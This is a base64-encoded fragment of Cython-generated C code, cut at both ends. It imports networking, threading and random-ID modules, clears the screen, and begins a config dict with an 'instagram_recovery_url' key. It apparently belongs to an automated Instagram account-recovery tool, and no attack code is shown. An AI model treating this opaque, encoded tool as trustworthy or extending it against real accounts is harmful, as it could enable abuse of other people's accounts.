VubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zYXksIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCA1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHlMaXN0X1BhY2soMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0ZvcmUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbml0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU3R5bGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvbG9yYW1hLCBfX3B5eF90XzMsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0ZvcmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0ZvcmUsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luaXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luaXQsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1N0eWxlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TdHlsZSwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cywgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9QeUxpc3RfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVGhyZWFkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVGltZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZywgX19weXhfdF8yLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UaHJlYWQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1RocmVhZCwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVGltZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1RpbWVyLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X1B5TGlzdF9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaG9pY2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kcmFuZ2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSwgX19weXhfdF8zLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaG9pY2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZSwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kcmFuZ2UsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgCiAgX19weXhfdF8yID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0ZXRpbWUsIF9fcHl4X3RfMiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0ZXRpbWUsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZCwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDExLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3V1aWQsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N1YnByb2Nlc3MsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdWJwcm9jZXNzLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0cmluZywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDE1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0cmluZywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDE3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbXBvcnRsaWIsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbXBvcnRsaWIsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGFzaGxpYiwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDIwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hhc2hsaWIsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAyMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8yID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyfTsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzUgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5pdCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDI0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIE5VTEx9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyNCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbml0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDEgOiAwKV0gPSB7X19weXhfdF8yLCBOVUxMfTsKICAgIF9fcHl4X3RfNCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI2LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXV0b3Jlc2V0LCBQeV9UcnVlLCBfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzKzEsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjYsIF9fcHl4X0wxX2Vycm9yKQogICAgX19weXhfdF8zID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzQpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDI2LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDE3KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbnN0YWdyYW1fcmVjb3ZlcnlfdXJsLCB